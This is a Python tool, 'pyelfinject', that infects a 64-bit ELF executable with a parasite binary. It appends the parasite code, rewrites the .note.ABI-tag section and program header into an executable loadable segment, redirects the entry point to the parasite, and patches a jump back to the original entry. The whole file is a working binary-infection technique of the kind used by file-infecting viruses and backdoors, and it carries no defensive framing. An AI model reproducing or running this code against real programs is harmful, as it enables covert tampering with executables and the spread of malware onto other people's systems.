import os
import struct
import sys

E_ENTRY_OFFSET = 0x18
E_SHENTSIZE_OFFSET = 0x3A
E_SHOFF_OFFSET = 0x28
E_PHENTSIZE_OFFSET = 0x36
E_PHOFF_OFFSET = 0x20

SHT_TYPE_OFFSET = 0x04
SHT_ADDR_OFFSET = 0x10
SHT_OFFSET_OFFSET = 0x18
SHT_SIZE_OFFSET = 0x20
SHT_ADDRALIGN_OFFSET = 0x30
SHT_FLAGS_OFFSET = 0x08

PT_TYPE_OFFSET = 0x00
PT_OFFSET_OFFSET = 0x08
PT_VADDR_OFFSET = 0x10
PT_PADDR_OFFSET = 0x18
PT_FILESZ_OFFSET = 0x20
PT_FLAGS_OFFSET = 0x04
PT_MEMSZ_OFFSET = 0x28
PT_ALIGN_OFFSET = 0x30

def align(addr, injected_addr):
    n = (injected_addr % 4096) - (addr % 4096)
    addr += n;
    return addr

def read_bytes_at(fd, addr, bytes):
    fd.seek(addr)
    return fd.read(bytes)

def write_at_addr(fd, addr, data):
    fd.seek(addr)
    fd.write(data)

def patch_parasite(host_binary, parasite_binary):
    parasite_fd = open(parasite_binary, "rb+")
    host_fd = open(host_binary, "rb")
    entry_point, = struct.unpack("<Q", read_bytes_at(host_fd, E_ENTRY_OFFSET, 8))
    s = parasite_fd.read()
    host_fd.read()
    injected_addr = host_fd.tell()
    injected_load_addr = align(0x800000, injected_addr)
    ret_offset = s.find(b'\xe8\x00\x00\x00\x00\x59')
    ret_offset += 5
    rel_addr_offset = ret_offset + 4
    relative_offset = (injected_load_addr + ret_offset) - entry_point
    write_at_addr(parasite_fd, rel_addr_offset, relative_offset.to_bytes(4, byteorder='little'))

def inject(host_binary, parasite_binary):
    fd = open(parasite_binary, "rb")
    content = fd.read()
    with open(host_binary, "ab") as binary:
        injected_addr = binary.tell()
        binary.write(content)

    fd.close()
    return injected_addr

def infect_section_header(fd, injected_addr, parasite_binary):
    # calculate offset to .note.ABI-tag section
    section_header_size, = struct.unpack("<H",read_bytes_at(fd, E_SHENTSIZE_OFFSET, 2))
    sht_offset, = struct.unpack("<Q",read_bytes_at(fd, E_SHOFF_OFFSET, 8))
    abi_tag_header_offset = sht_offset + (2*section_header_size)

    # change SH_TYPE to SHT_PROGBITS
    write_at_addr(fd, abi_tag_header_offset + SHT_TYPE_OFFSET, b'\x01\x00\x00\x00')

    # change SH_ADDR to injected_addr
    injected_load_addr = align(0x800000, injected_addr)
    write_at_addr(fd, abi_tag_header_offset + SHT_ADDR_OFFSET, injected_load_addr.to_bytes(8, byteorder='little'))

    # change sh_size to size of injected code
    injected_size = os.stat(parasite_binary).st_size
    d = injected_size.to_bytes(8, byteorder='little')
    write_at_addr(fd, abi_tag_header_offset + SHT_SIZE_OFFSET, d)

    # change SH_OFFSET to injected_addr
    d = injected_addr.to_bytes(8, byteorder='little')
    write_at_addr(fd, abi_tag_header_offset + SHT_OFFSET_OFFSET, d)

    # change sh_addralign to 16
    d = (16).to_bytes(8, byteorder='little')
    write_at_addr(fd, abi_tag_header_offset + SHT_ADDRALIGN_OFFSET, d)

    # add executable flag
    d = (6).to_bytes(8, byteorder='little')
    write_at_addr(fd, abi_tag_header_offset + SHT_FLAGS_OFFSET, d)

    # compute PC relative offset and update parasite binary to 
    # to return to _start code
    


def infect_program_header(fd, injected_addr, parasite_binary):
    # calculate offset to program header containing .note.ABI-tag section
    program_header_size, = struct.unpack("<H",read_bytes_at(fd, E_PHENTSIZE_OFFSET, 2))
    pt_offset, = struct.unpack("<Q",read_bytes_at(fd, E_PHOFF_OFFSET, 8))
    abi_tag_pt_offset = pt_offset + (5*program_header_size)

    # change p_type to PT_LOAD
    write_at_addr(fd, abi_tag_pt_offset + PT_TYPE_OFFSET, b'\x01\x00\x00\x00')

    # change p_offset to injected_addr
    d = injected_addr.to_bytes(8, byteorder='little')
    write_at_addr(fd, abi_tag_pt_offset + PT_OFFSET_OFFSET, d)

    # change p_vaddr to injected_addr
    d = align(0x800000, injected_addr).to_bytes(8, byteorder='little')
    write_at_addr(fd, abi_tag_pt_offset + PT_VADDR_OFFSET, d)
    write_at_addr(fd, abi_tag_pt_offset + PT_PADDR_OFFSET, d)

    # change p_filesz to size of injected code
    injected_size = os.stat(parasite_binary).st_size
    d = injected_size.to_bytes(8, byteorder='little')
    write_at_addr(fd, abi_tag_pt_offset + PT_FILESZ_OFFSET, d)

    # change p_memsz to size of injected code
    write_at_addr(fd, abi_tag_pt_offset + PT_MEMSZ_OFFSET, d)

    # change segment flags (p_flags) to executable and readable
    d = (5).to_bytes(4, byteorder='little')
    write_at_addr(fd, abi_tag_pt_offset + PT_FLAGS_OFFSET, d)

    # change p_align to 0x1000
    write_at_addr(fd, abi_tag_pt_offset + PT_ALIGN_OFFSET, b'\x00\x10\x00\x00\x00\x00\x00\x00')


def infect_entry_point(fd, injected_addr):
    # change p_vaddr to injected_addr
    d = align(0x800000, injected_addr).to_bytes(8, byteorder='little')
    write_at_addr(fd, E_ENTRY_OFFSET, d)


def main():
    if len(sys.argv) != 3:
        print("Usage: pyelfinject <host> <parasite>")
        return
        
    host_binary = sys.argv[1]
    parasite_binary = sys.argv[2]
   
    # Patch parasite binary with relative jump to original entry point
    patch_parasite(host_binary, parasite_binary)

    # Append the bytes to the end of the target binary
    injected_addr = inject(host_binary, parasite_binary)

    fd = open(host_binary, "rb+")
    
    # Infect .note.ABI-tag section header
    infect_section_header(fd, injected_addr, parasite_binary)

    # Infect program header
    infect_program_header(fd, injected_addr, parasite_binary)

    # Overwrite entry point
    infect_entry_point(fd, injected_addr)

    fd.close()

if __name__ == "__main__":
    main()
